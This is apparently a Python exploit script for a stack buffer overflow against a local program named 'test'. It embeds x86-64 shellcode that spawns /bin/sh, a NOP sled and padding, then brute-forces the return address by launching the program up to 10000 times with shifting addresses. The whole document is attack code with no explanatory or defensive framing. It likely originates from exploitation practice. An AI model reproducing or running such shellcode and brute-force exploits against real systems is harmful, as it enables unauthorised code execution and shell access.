import struct
from subprocess import *
import os



shellcode ="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"



nop = "\x90"*20
ret = "\xc1\xdc\xff\xff\xff\x7f  " #0x7fffffffdcc0
junk = "A"*40

offset = 20
test = 10000

while test > 0 :

	x = (struct.unpack("<Q",ret))[0]

	print ('ret : ' + hex(x))
	call(['./test', junk + ret[:6],'a', nop + shellcode])

	x -= offset	
	#print(hex(x))
	x = struct.pack('<Q',x)
	ret = x
	
	test -=1
